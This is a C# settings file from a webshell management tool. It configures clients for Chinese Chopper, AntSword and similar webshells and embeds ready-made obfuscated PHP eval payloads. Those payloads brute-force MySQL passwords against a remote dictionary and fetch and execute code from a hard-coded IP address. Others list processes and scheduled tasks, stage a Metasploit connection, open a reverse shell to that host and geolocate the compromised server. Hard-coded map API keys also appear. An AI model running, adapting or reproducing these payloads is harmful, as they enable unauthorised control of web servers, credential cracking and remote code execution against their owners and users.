﻿using C2.Core;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace C2.Business.CastleBravo.WebShellTool
{
    public class ClientSetting
    {

        [DllImport("kernel32")]
        private static extern int GetPrivateProfileString(string lpAppName, string lpKeyName, string lpDefault, StringBuilder lpReturnedString, int nSize, string lpFileName);

        public static string UnlockFilePath = Path.Combine(Application.StartupPath, "Resources", "WebShellConfig", "SuperPowerConfig.ini");//DD功能解锁文件地址

        private static readonly string WebShellFilePath = Path.Combine(Application.StartupPath, "Resources", "WebShellConfig");
        public static readonly Dictionary<string, Tuple<string, string>> WSDict = new Dictionary<string, Tuple<string, string>>
        {
            { "中国菜刀16_自定义版", Tuple.Create(Path.Combine(WebShellFilePath, "Cknife16_Jar_Custom_Config.ini"),"Common") },
            { "中国菜刀16_JAR版", Tuple.Create(Path.Combine(WebShellFilePath, "Cknife16_Jar_Config.ini"),"Common") },
            { "中国菜刀16_EXE版", Tuple.Create(Path.Combine(WebShellFilePath, "Cknife16_EXE_Config.ini"),"CKnife16EXE") },
            { "中国菜刀11_EXE版", Tuple.Create(Path.Combine(WebShellFilePath, "Cknife11_EXE_Config.ini"),"Common") },
            { "中国菜刀14_EXE版", Tuple.Create(Path.Combine(WebShellFilePath, "Cknife14_EXE_Config.ini"),"Common") },
            { "中国菜刀18_BYPASS版", Tuple.Create(Path.Combine(WebShellFilePath, "Cknife18_Bypass_Config.ini"),"Common") },
            { "奥特曼2015_PHP版", Tuple.Create(Path.Combine(WebShellFilePath, "Altman15_PHP_Config.ini"),"Common") },
            { "蚁剑2.1.14版", Tuple.Create(Path.Combine(WebShellFilePath, "AntSword_2114_Config.ini"), "AntSword2114") },  // 2114版大部分参数都是每次随机变化的
            { "Xise19.9版", Tuple.Create(Path.Combine(WebShellFilePath, "Xise19_WAF_Config.ini"), "Xise19") },
            { "ASP通用版", Tuple.Create(Path.Combine(WebShellFilePath, "ASP_Custom_Config.ini"), "ASPCustom") },
        };

        public string SPL;
        public string SPR;
        public string CODE;
        public string ACTION;
        public string PARAM1;
        public string PARAM2;
        public string PARAM3;
        public string PHP_BASE64;
        public string PHP_MAKE;
        public string PHP_INFO;
        public string PHP_INDEX;
        public string PHP_READDICT;
        public string PHP_READFILE;
        public string PHP_SAVEFILE;
        public string PHP_DELETE;
        public string PHP_RENAME;
        public string PHP_RETIME;
        public string PHP_NEWDICT;
        public string PHP_UPLOAD;
        public string PHP_DOWNLOAD;
        public string PHP_SHELL;
        public string PHP_DB_MYSQL;
        public string z0;
        public string z9;

        public static readonly ClientSetting Empty = new ClientSetting();

        public ClientSetting()
        {
        }

        public static ClientSetting LoadSetting(string version)
        {
            if (!WSDict.ContainsKey(version))
                return ClientSetting.Empty;

            string path = WSDict[version].Item1;

            if (string.IsNullOrEmpty(path))
                return ClientSetting.Empty;

            return new ClientSetting() {
                SPL = Read(version, "SPL", path),
                SPR = Read(version, "SPR", path),
                CODE = Read(version, "CODE", path),
                ACTION = Read(version, "ACTION", path),
                PARAM1 = Read(version, "PARAM1", path),
                PARAM2 = Read(version, "PARAM2", path),
                PARAM3 = Read(version, "PARAM3", path),
                PHP_BASE64 = Read(version, "PHP_BASE64", path),
                PHP_MAKE = Read(version, "PHP_MAKE", path),
                PHP_INFO = Read(version, "PHP_INFO", path),
                PHP_INDEX = Read(version, "PHP_INDEX", path),
                PHP_READDICT = Read(version, "PHP_READDICT", path),
                PHP_READFILE = Read(version, "PHP_READFILE", path),
                PHP_SAVEFILE = Read(version, "PHP_SAVEFILE", path),
                PHP_DELETE = Read(version, "PHP_DELETE", path),
                PHP_RENAME = Read(version, "PHP_RENAME", path),
                PHP_RETIME = Read(version, "PHP_RETIME", path),
                PHP_NEWDICT = Read(version, "PHP_NEWDICT", path),
                PHP_UPLOAD = Read(version, "PHP_UPLOAD", path),
                PHP_DOWNLOAD = Read(version, "PHP_DOWNLOAD", path),
                PHP_SHELL = Read(version, "PHP_SHELL", path),
                PHP_DB_MYSQL = Read(version, "PHP_DB_MYSQL", path),
                z0 = Read(version, "z0", path),
                z9 = Read(version, "z9", path)
            };
        }

        /// <summary>
        /// 读取INI文件值
        /// </summary>
        /// <param name="section">节点名</param>
        /// <param name="key">键</param>
        /// <param name="filePath">INI文件完整路径</param>
        /// <returns>读取的值</returns>
        public static string Read(string section, string key, string filePath)
        {
            int nSize = 1024 * 4;
            StringBuilder sb = new StringBuilder(nSize);
            GetPrivateProfileString(section, key, String.Empty, sb, nSize, filePath);
            return sb.ToString();
        }

        /*<--静态变量复制先后顺序不能改变-->*/
        public static string MysqlAccount = "root";
        public static string MysqlDictAddr = "http://103.43.17.9/wk/db_dict";
        public static string MysqlPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_POST[0])));&0=YzJWMFgzUnBiV1ZmYkdsdGFYUW9NQ2s3YVdZb0lXbHpjMlYwS0NSZlVrVlJWVVZUVkZzeFhTa3BaWGhwZENncE93MEtKSEk5YVhOelpYUW9KRjlTUlZGVlJWTlVXekpkS1Q4a1gxSkZVVlZGVTFSYk1sMDZJbkp2YjNRaU93MEtKSEE5Wm1sc1pTaEFZbUZ6WlRZMFgyUmxZMjlrWlNna1gxSkZVVlZGVTFSYk1WMHBLVHNnRFFwbWIzSW9KR2s5TURza2FUeGpiM1Z1ZENna2NDazdKR2tyS3lsN2FXWW9ZM1FvSkhJc2RISnBiU2h6ZEhKZmNtVndiR0ZqWlNoUVNGQmZSVTlNTENjbkxDUndXeVJwWFNrcEtTbDdaWGhwZENncE8zMW1iSFZ6YUNncE8zMWxZMmh2SUNKUlFVTkxURE5KVHpsUVBUMU9iM1FnUm1sdVpDQlFZWE56ZDI5eVpEMDlVVUZEUzB3elNVODVVQ0k3RFFwbWRXNWpkR2x2YmlCamRDZ2tjaXdrY0NsN0pHTTlRRzE1YzNGc1gyTnZibTVsWTNRb0lteHZZMkZzYUc5emRDSXNKSElzSkhBcE8ybG1LQ1JqS1h0bFkyaHZJQ0pSUVVOTFRETkpUemxRUFQxRGNtRmphMlZrSUhOMVkyTmxjM05tZFd4c2VTd2djR0Z6YzNkdmNtUWdPaUl1SkhBdUlqMDlVVUZEUzB3elNVODVVQ0k3Y21WMGRYSnVJSFJ5ZFdVN2ZXVnNjMlY3Y21WMGRYSnVJR1poYkhObE8zMTk=&1=" + ST.EncodeBase64(ClientSetting.MysqlDictAddr) + "&2=" + ClientSetting.MysqlAccount;

        public static string TrojanHorsePayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=YzJWMFgzUnBiV1ZmYkdsdGFYUW9NQ2s3RFFva1pEMUFZbUZ6WlRZMFgyUmxZMjlrWlNna1gxQlBVMVJiT1RsZEtUc05DaVJqYjJSbFBXWnBiR1ZmWjJWMFgyTnZiblJsYm5SektDUmtLVHNOQ2tCbGRtRnNLR2Q2YVc1bWJHRjBaU2drWTI5a1pTa3BPdw&99=aHR0cDovLzEwMy40My4xNy45L2Flc3MuZ2lm&dir={1}&type=p&time={2};";
        public static string SystemInfoPayload = String.Empty;
        public static string ProcessViewPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=YzJWemMybHZibDl6ZEdGeWRDZ3BPdzBLSkdOdFpDQTlJSE4wY21semRISW9VRWhRWDA5VExDSjNhVzRpS1Q4aWRHRnphMnhwYzNRaU9pSndjeUF0WldZaU93MEthV1lvWlcxd2RIa29KRjlUUlZOVFNVOU9XeWQ1ZG5GQ0oxMHBLUTBLZXlSZlUwVlRVMGxQVGxzbmVYWnhRaWRkUFdacGJHVmZaMlYwWDJOdmJuUmxiblJ6S0NKb2RIUndPaTh2TVRBekxqUXpMakUzTGprdmQyc3ZZMjFrTG1kcFppSXBPMzBOQ2tCbGRtRnNLR2Q2YVc1bWJHRjBaU2drWDFORlUxTkpUMDViSjNsMmNVSW5YU2twT3c9PQ==";
        public static string ScheduleTaskPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=YzJWemMybHZibDl6ZEdGeWRDZ3BPdzBLYVdZb1pXMXdkSGtvSkY5VFJWTlRTVTlPV3lkamRpZGRLU2tOQ25za1gxTkZVMU5KVDA1YkoyTjJKMTA5Wm1sc1pWOW5aWFJmWTI5dWRHVnVkSE1vSW1oMGRIQTZMeTh4TURNdU5ETXVNVGN1T1M5M2F5OWpiV1F1WjJsbUlpazdaV05vYnlBeU8zME5DbVZqYUc4Z01Uc05Da0JsZG1Gc0tHZDZhVzVtYkdGMFpTZ2tYMU5GVTFOSlQwNWJKMk4ySjEwcEtUc05DZzBLYzJWemMybHZibDl6ZEdGeWRDZ3BPdzBLSkdOdFpDQTlJSE4wY21semRISW9VRWhRWDA5VExDSjNhVzRpS1Q4aVUwTklWRUZUUzFNZ0wxRjFaWEo1SUM5V0lDOUdUeUJNU1ZOVUlIeG1hVzVrYzNSeUlDZm9wb0hvdjVEb29Zem5tb1RrdTd2bGlxRW5Jam9pWTNKdmJuUmhZaUF0YkNJN0RRcHBaaWhsYlhCMGVTZ2tYMU5GVTFOSlQwNWJKM2wyY1VJblhTa3BEUXA3SkY5VFJWTlRTVTlPV3lkNWRuRkNKMTA5Wm1sc1pWOW5aWFJmWTI5dWRHVnVkSE1vSW1oMGRIQTZMeTh4TURNdU5ETXVNVGN1T1M5M2F5OWpiV1F1WjJsbUlpazdmUTBLUUdWMllXd29aM3BwYm1ac1lYUmxLQ1JmVTBWVFUwbFBUbHNuZVhaeFFpZGRLU2s3";
        public static string LocationPayload = "{0}=@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[0])));&0=SkhWeWJDQTlJQ0pvZEhSd2N6b3ZMM2QzZHk1bmIyOW5iR1V1WTI5dExtaHJMMjFoY0hNaU93MEtKSFJsZUhRZ1BTQm1hV3hsWDJkbGRGOWpiMjUwWlc1MGN5Z2tkWEpzS1RzTkNpUnRZWFJqYUNBOUlDSitLRnN3TFRrdVhTc3BKVEpES0Zzd0xUa3VYU3NwZmlJN0RRcHdjbVZuWDIxaGRHTm9LQ1J0WVhSamFDd2tkR1Y0ZEN3a2JTazdEUXBsWTJodklDSlJRVU5MVEROSlR6bFFQVDBpTGlSdFd6RmRMaUlzSWk0a2JWc3lYUzRpUFQxUlFVTkxURE5KVHpsUUlqcz0=";
        public static string MSFHost = "103.43.17.9:8889";
        public static string ReverseShellHost = "103.43.17.9:8889";
        public static string MSFPayload = "{0}=@eval/*AbasBwwevC*/(base64_decode(strrev($_REQUEST[0])));&0===QfK0wOpgSZpRGIgACIK0QfgACIgoQD7kiYkgCbhZXZgACIgACIgAiCNsHIlNHblBSfgACIgoQD7kCKzNXYwlnYf5Waz9Ga1NHJgACIgACIgAiCNsTKiRCIscyJo42bpR3YuVnZfVGdhVmcjBSPgM3chBXei9lbpN3boV3ckACIgACIgACIK0wegkSKnwWY2V2XlxmYhNXak5icvRXdjVGel5ibpN3boV3cngCdld2Xp5WagYiJgkyJul2cvhWdzdCKkVGZh9Gbf52bpNnblRHelhCImlGIgACIK0wOlBXe091ckASPg01JlBXe091aj92cnNXbns1UMFkQPx0RkACIgACIK0wOzRCI9ASXns2YvN3Zz12JbNFTBJ0TMdEJgkgCN0HIgACIK0QfgACIgACIgAiCNszahVmciBCIgACIgACIgACIgACIgAiCNsTKpIGJo4WZsJHdzBSLg4WZsRCIsMHJoQWYlJ3X0V2aj92cg0jLgIGJgACIgACIgACIgACIgACIgoQD6cCdlt2YvN3JgU2chNGIgACIgACIgACIgAiCNszahVmciBCIgACIgACIgACIgACIgAiCNsTKpIGJo4WZsJHdzBSLg4WZsRCIsMHJoQWYlJnZg0jLgIGJgACIgACIgACIgACIgACIgoQD6cSbhVmc0N3JgU2chNGIgACIgACIgACIgAiCNsHIpUGc5R3XzRCKgg2Y0l2dzBCIgACIgACIK0wegkiblxGJgwDIpIGJo4WZsJHdzhCIlxWaodHIgACIK0wOncCI9AiYkACIgAiCNsTXn4WZsdyWhRCI9AiblxGJgACIgoQD7kiblxGJgwiIuVGbOJCKrNWYw5Wdg0DIhRCIgACIK0QfgACIgoQD7kCKllGZgACIgACIgAiCNsHIp4WZsRSIoAiZpBCIgAiCN0HIgACIK0wOrFWZyJGIgACIgACIgACIgAiCNsTK0ACLzRCKkFWZy9Fdlt2YvNHI9AiblxGJgACIgACIgACIgACIK0gOnQXZrN2bzdCIlNXYjBCIgACIgACIK0wOrFWZyJGIgACIgACIgACIgAiCNsTK0ACLzRCKkFWZyZGI9AiblxGJgACIgACIgACIgACIK0gOn0WYlJHdzdCIlNXYjBCIgACIgACIK0wegkSZwlHdfNHJoACajRXa3NHIgACIK0QfgACIgoQD7kyJ0V2aj92cg8mbngSZpRGIgACIgACIgoQD7BSKzRSIoAiZpBCIgAiCN0HIgACIK0wOpcycj5WdmBCdlt2YvNHIv52JoUWakBCIgACIgACIK0wegkSZwlHdfNHJhgCImlGIgACIK0QfgACIgoQD7cCdlt2YvN3Jg0DIlBXe091ckACIgACIgACIK0QfgACIgACIgAiCNsTKoUWakBCIgACIgACIgACIgoQD7BSKzVmckECKgYWagACIgACIgAiCNsTK0J3bwRCIsAXakACLzRCK0NWZu52bj9Fdlt2YvNHQg0DIzVmckACIgACIgACIK0wOpA1QU9FTPNFIs0UQFJFVT91SD90UgwCVF5USfZUQoYGJg0DIzRCIgACIgACIgoQD7BSKpYGJoUGbiFGbsF2YfNXagYiJgkyJlRXYlJ3YfRXZrN2bzdCI9AiZkgCImYCIzRSIoAiZpBCIgAiCN0HIgACIK0wOn0WYlJHdzdCI9ASZwlHdfNHJgACIgACIgAiCNsTK0J3bwRCIsAXakgiZkASPgMHJgACIgACIgAiCNsHIpkiZkgSZsJWYsxWYj91cpBiJmASKn4WZw92aj92cmdCI9AiZkgCImYCIzRSIoAiZpBCIgAiCN0HIgACIK0wOn0WYlJHdzdCI9ASZwlHdfNHJgACIgACIgAiCNsTKi0Hdy9GcksnO9BXaks3LvoDcjRnIoYGJg0DIzRCIgACIgACIgoQD7BSKpYGJoUGbiFGbsF2YfNXagYiJgkyJ05WZpx2YfRXZrN2bz9VbhVmc0N3Jg0DImRCKoAiZpBCIgAiCNsDdy9Gck4iI0J3bwJCIvh2YllgCNsDcpRCIuICcpJCIvh2YllgCNsTXxsFVT9EUfRCI9ACdy9GckACIgAiCNsTKdJzWUN1TQ9FJoUGZvNWZk9FN2U2chJGI9ACcpRCIgACIK0gCNsHIpkSXysFVT9EUfRCK0V2czlGImYCIp0VMbR1UPB1XkgCdlN3cphCImlmCNsTKxgCdy9mYh9lclNXdfVmcv52ZppQD7kCMoQXatlGbfVWbpR3X0V2c&1={1}&2={2}";
        public static string ReverseShellPayload = "{0}=@eval/*AbasBwwevC*/(base64_decode(base64_decode($_REQUEST[0])));&0=WlhKeWIzSmZjbVZ3YjNKMGFXNW5LRVZmUlZKU1QxSWdmQ0JGWDFCQlVsTkZLVHRBYzJWMFgzUnBiV1ZmYkdsdGFYUW9NQ2s3RFFva2IzTTlVRWhRWDA5VE93MEthV1lvYVhOelpYUW9KRjlRVDFOVVd6RmRLU1ltYVhOelpYUW9KRjlRVDFOVVd6SmRLU2tOQ25za2NHOXlkRDBrWDFCUFUxUmJNVjA3RFFva2FYQTlZbUZ6WlRZMFgyUmxZMjlrWlNna1gxQlBVMVJiTWwwcE93MEtKR1p3UFdaemIyTnJiM0JsYmlna2FYQWdMQ0FrY0c5eWRDQXNJQ1JsY25KdWJ5d2dKR1Z5Y25OMGNpazdEUXBwWmlBb0lTUm1jQ2w3RFFva2NtVnpkV3gwSUQwZ0lrNXZkQ0JqYjI1dVpXTjBhVzl1SWpzTkNuME5DbVZzYzJVZ2V3MEtabkIxZEhNZ0tDUm1jQ0FzSWx4dUtrOVRPaUl1Skc5ekxpSXVJRU52Ym01bFkzUWdjM1ZqWTJWemN5RXFYRzRpS1RzTkNuZG9hV3hsS0NGbVpXOW1LQ1JtY0NrcGV5QU5DbVp3ZFhSeklDZ2tabkFzSWlCemFHVnNiRG9nSWlrN0RRb2tjbVZ6ZFd4MFBTQm1aMlYwY3lBb0pHWndMQ0EwTURrMktUc05DaVJ0WlhOellXZGxQV0FrY21WemRXeDBZRHNOQ21ad2RYUnpJQ2drWm5Bc0lpMHRQaUFpTGlSdFpYTnpZV2RsTGlKY2JpSXBPeUI5RFFwbVkyeHZjMlVnS0NSbWNDazdmWDA9&1={1}&2={2}";
        public static Dictionary<InfoType, string> InfoPayloadDict = new Dictionary<InfoType, string>
                                           {
                                             {InfoType.MysqlBlasting, MysqlPayload },
                                             {InfoType.SystemInfo, SystemInfoPayload },
                                             {InfoType.ProcessView, ProcessViewPayload },
                                             {InfoType.ScheduleTask, ScheduleTaskPayload },
                                             {InfoType.LocationInfo, LocationPayload },
                                             {InfoType.MSF, MSFPayload},
                                             {InfoType.NC, ReverseShellPayload} };
        /*<--静态变量赋值先后顺序不能改变-->*/
        public static List<string> BDLocationAK = new List<string>()
                                                  {
                                                  "YcVOPhECz13S3kEi8drRYjTjCxxD6ovF",
                                                  "wFtP7Go4rUxNf3bm8jQBcLOe0LC7dNCR"
                                                  };
        public static string BDLocationAPI = "https://api.map.baidu.com/reverse_geocoding/v3/?ak={0}&output=json&coordtype=wgs84ll&location={1}";
    }
}
